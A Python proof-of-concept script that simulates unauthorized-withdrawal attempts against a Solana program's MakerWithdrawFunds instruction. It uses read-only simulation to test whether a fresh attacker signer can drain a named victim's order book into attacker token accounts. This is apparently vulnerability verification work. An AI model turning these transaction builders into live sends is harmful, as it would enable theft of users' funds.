#!/usr/bin/env python3
"""Independent Archer MakerWithdrawFunds simulation MATRIX (Task A).
READ-ONLY: simulateTransaction only, sigVerify=false. No keys, no sends."""
import json, base64, hashlib, sys
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature
from rpc import rpc

ARCHER = Pubkey.from_string("Archer8kgiavM61GyusMzaaS2ft5sALtNsD1HxkUPMhy")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
SYS = Pubkey.from_string("11111111111111111111111111111111")
TOKENKEG = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
PAYER = Pubkey.from_string("AuthYRbdcyksthcB1AM8ZKB3CidzChURkLzsGN8pYUmw")

def fresh(tag): return Pubkey.from_bytes(hashlib.sha256(tag.encode()).digest())
def ata(owner, mint, tp):
    return Pubkey.find_program_address([bytes(owner), bytes(tp), bytes(mint)], ATA_PROG)[0]

def create_idem(payer, owner, mint, tp):
    return Instruction(ATA_PROG, bytes([1]), [
        AccountMeta(payer, True, True), AccountMeta(ata(owner, mint, tp), False, True),
        AccountMeta(owner, False, False), AccountMeta(mint, False, False),
        AccountMeta(SYS, False, False), AccountMeta(tp, False, False)])

def withdraw(market, book, maker, base_mint, quote_mint, base_vault, quote_vault,
             mbase_ata, mquote_ata, base_tp, quote_tp, authority,
             base_lots, quote_lots, mw=True, bw=True):
    data = bytes([12]) + base_lots.to_bytes(8, "little") + quote_lots.to_bytes(8, "little")
    metas = [
        AccountMeta(market, False, mw), AccountMeta(book, False, bw),
        AccountMeta(maker, True, True), AccountMeta(base_mint, False, False),
        AccountMeta(quote_mint, False, False), AccountMeta(base_vault, False, True),
        AccountMeta(quote_vault, False, True), AccountMeta(mbase_ata, False, True),
        AccountMeta(mquote_ata, False, True), AccountMeta(base_tp, False, False),
        AccountMeta(quote_tp, False, False), AccountMeta(authority, True, False)]
    return Instruction(ARCHER, data, metas)

def sim(ixs, label, results):
    msg = Message.new_with_blockhash(ixs, PAYER, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    res = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                            "replaceRecentBlockhash": True, "commitment": "processed"}])
    entry = {"label": label}
    if isinstance(res, dict) and "value" in res:
        v = res["value"]
        entry["err"] = v.get("err")
        entry["unitsConsumed"] = v.get("unitsConsumed")
        entry["logs"] = v.get("logs")
    else:
        entry["rpc_error"] = res
    results.append(entry)
    print("\n===== SIM:", label, "=====")
    print("err:", json.dumps(entry.get("err", entry.get("rpc_error"))))
    for l in (entry.get("logs") or []):
        print("  ", l)
    return entry

def owner(pk):
    r = rpc("getAccountInfo", [str(pk), {"encoding": "base64"}])
    try: return Pubkey.from_string(r["value"]["owner"])
    except Exception: return None

def main():
    mk = {m["market"]: m for m in json.load(open("markets.json"))}
    victim = Pubkey.from_string("GLKCuotKSjPtQhxHmf6q8GUkw6tUZnzs8W5vEbxdaBdK")
    market = Pubkey.from_string("BZDUzrgR1ns4PykkvHCorxfsg9M3zc9a7xbztv3kjfCC")
    book = Pubkey.from_string("939Pgm7Jz3E8PuTZsXEK4fAf5EpUGPpPqf4dpALkTwmu")
    m = mk[str(market)]
    base_mint = Pubkey.from_string(m["base_mint"]); quote_mint = Pubkey.from_string(m["quote_mint"])
    base_vault = Pubkey.from_string(m["base_vault"]); quote_vault = Pubkey.from_string(m["quote_vault"])
    base_tp = owner(base_mint); quote_tp = owner(quote_mint)
    attacker = fresh("hylo-verify-attacker-1")
    print("victim:", victim, "| attacker:", attacker)
    print("market:", market, "| base_tp:", base_tp, "| quote_tp:", quote_tp)

    R = []
    def run(label, signer, bk, mbase_ata, mquote_ata, mw=True, bw=True, bl=0, ql=1):
        ixs = [create_idem(PAYER, signer, base_mint, base_tp),
               create_idem(PAYER, signer, quote_mint, quote_tp),
               withdraw(market, bk, signer, base_mint, quote_mint, base_vault, quote_vault,
                        mbase_ata, mquote_ata, base_tp, quote_tp, signer, bl, ql, mw, bw)]
        return sim(ixs, label, R)

    # (i) ATTACK: fresh signer, victim's book, attacker's own ATAs
    run("ATTACK fresh-signer + victim-book (writable)", attacker, book,
        ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp))
    # (ii) CONTROL: victim signer, victim's own book
    run("CONTROL victim-signer + victim-book (writable)", victim, book,
        ata(victim, base_mint, base_tp), ata(victim, quote_mint, quote_tp))
    # (iii) CONTROL readonly market/book (reproduce earlier post-auth error)
    run("CONTROL victim-signer readonly mkt/book", victim, book,
        ata(victim, base_mint, base_tp), ata(victim, quote_mint, quote_tp), mw=False, bw=False)
    # (iv) ATTACK readonly mkt/book
    run("ATTACK fresh-signer readonly mkt/book", attacker, book,
        ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp), mw=False, bw=False)
    # (v) attacker signs, victim book, but ATAs owned by victim (funds->victim)
    run("ATTACK fresh-signer victim-book victim-ATAs", attacker, book,
        ata(victim, base_mint, base_tp), ata(victim, quote_mint, quote_tp))
    # (vi) fresh book derived as PDA of (attacker, market) [may not exist]
    try:
        fresh_book = Pubkey.find_program_address([bytes(attacker), bytes(market)], ARCHER)[0]
        print("derived fresh_book:", fresh_book)
        run("ATTACK fresh-signer + derived-fresh-book", attacker, fresh_book,
            ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp))
    except Exception as e:
        print("derive err", e)
    # (vii) victim signs, victim book, withdraw base_lots=1 (base side)
    run("CONTROL victim-signer base_lots=1 quote_lots=0", victim, book,
        ata(victim, base_mint, base_tp), ata(victim, quote_mint, quote_tp), bl=1, ql=0)

    # --- authority / destination binding variants (parent A2 => 303) ---
    def run2(label, maker, authority, bk, mbase_ata, mquote_ata):
        ixs = [create_idem(PAYER, maker, base_mint, base_tp),
               create_idem(PAYER, maker, quote_mint, quote_tp),
               withdraw(market, bk, maker, base_mint, quote_mint, base_vault, quote_vault,
                        mbase_ata, mquote_ata, base_tp, quote_tp, authority, 0, 1)]
        return sim(ixs, label, R)
    run2("A2 maker=victim authority=attacker attacker-ATAs", victim, attacker, book,
         ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp))
    run2("A2b maker=attacker authority=victim attacker-ATAs", attacker, victim, book,
         ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp))
    run2("A4 maker=victim authority=victim attacker-ATAs(dest)", victim, victim, book,
         ata(attacker, base_mint, base_tp), ata(attacker, quote_mint, quote_tp))

    json.dump(R, open("sim_taskA_matrix.json", "w"), indent=2)
    print("\nwrote sim_taskA_matrix.json")

if __name__ == "__main__":
    main()
